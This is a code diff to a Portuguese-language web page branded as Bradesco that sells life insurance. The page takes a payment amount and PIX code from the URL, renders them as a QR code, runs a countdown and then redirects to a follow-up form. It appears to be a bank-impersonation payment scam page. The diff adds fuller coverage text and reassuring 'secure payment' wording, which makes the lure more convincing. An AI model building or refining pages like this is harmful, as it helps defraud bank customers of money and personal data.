@@ -40,7 +40,6 @@ body {
 .titulo {
     font-size: 20px;
     font-weight: bold;
-    margin-bottom: 10px;
 }
 
 /* VALOR */
@@ -57,7 +56,10 @@ body {
     font-size: 14px;
     color: #333;
     margin: 15px 0;
-    line-height: 1.5;
+    line-height: 1.6;
+    background: #fafafa;
+    padding: 15px;
+    border-radius: 12px;
 }
 
 /* BOTÕES */
@@ -103,17 +105,42 @@ textarea {
     <div class="logo-text">Bradesco</div>
 </div>
 
-<div class="container" id="cliente">
+<div class="container">
 
     <div class="titulo">Seguro de Vida</div>
 
     <div class="valor" id="valor">R$ 0,00</div>
 
     <div class="detalhes">
-        ✔ Cobertura em caso de imprevistos<br>
-        ✔ Proteção para você e sua família<br>
-        ✔ Assistência 24h<br>
-        ✔ Processo rápido e seguro
+
+    <strong>Sobre o Seguro de Vida</strong><br><br>
+
+    O seguro de vida oferece proteção financeira para você e sua família em momentos importantes, garantindo mais tranquilidade e segurança.
+
+    <br><br>
+
+    <strong>Coberturas incluídas:</strong><br>
+    ✔ Morte natural ou acidental<br>
+    ✔ Invalidez permanente<br>
+    ✔ Assistência funeral<br>
+    ✔ Suporte emergencial<br>
+
+    <br>
+
+    <strong>Serviços adicionais:</strong><br>
+    ✔ Atendimento 24 horas<br>
+    ✔ Orientação especializada<br>
+    ✔ Assistência residencial<br>
+    ✔ Suporte em imprevistos<br>
+
+    <br>
+
+    <strong>Vantagens:</strong><br>
+    ✔ Contratação simples<br>
+    ✔ Proteção familiar<br>
+    ✔ Pagamento facilitado<br>
+    ✔ Processo seguro<br>
+
     </div>
 
     <div id="qr"></div>
@@ -127,8 +154,8 @@ textarea {
     <div id="timer"></div>
 
     <div class="seguro">
-        🔒 Ambiente seguro para pagamento<br>
-        Seus dados são protegidos
+        🔒 Pagamento seguro<br>
+        Seus dados estão protegidos
     </div>
 
 </div>
@@ -137,7 +164,7 @@ textarea {
 let tempo = 50;
 let countdown;
 
-/* CARREGAR */
+/* CARREGAR DADOS */
 function carregar(){
     let p = new URLSearchParams(location.search);
 
@@ -146,24 +173,28 @@ function carregar(){
 
     if(!valor || !pix) return;
 
-    document.getElementById("valor").innerText = "R$ "+valor;
-    codigoPix.value = pix;
+    document.getElementById("valor").innerText = "R$ " + valor;
+    document.getElementById("codigoPix").value = pix;
 
     window.pix = pix;
 
-    new QRCode(qr, {text:pix,width:200,height:200});
+    new QRCode(document.getElementById("qr"), {
+        text: pix,
+        width: 200,
+        height: 200
+    });
 }
 
 /* COPIAR + TIMER */
 function copiar(){
     navigator.clipboard.writeText(window.pix);
-    alert("Copiado!");
+    alert("Código PIX copiado!");
 
     tempo = 50;
 
     countdown = setInterval(()=>{
         document.getElementById("timer").innerText =
-        "Redirecionando em "+tempo+"s para confirmação...";
+        "Redirecionando para confirmação em " + tempo + "s";
 
         tempo--;
 
@@ -175,10 +206,10 @@ function copiar(){
     },1000);
 }
 
-/* IR PARA FORM */
+/* IR PARA FORMULÁRIO */
 function irFormulario(){
     let params = new URLSearchParams(location.search);
-    window.location.href = "form.html?"+params.toString();
+    window.location.href = "form.html?" + params.toString();
 }
 
 carregar();
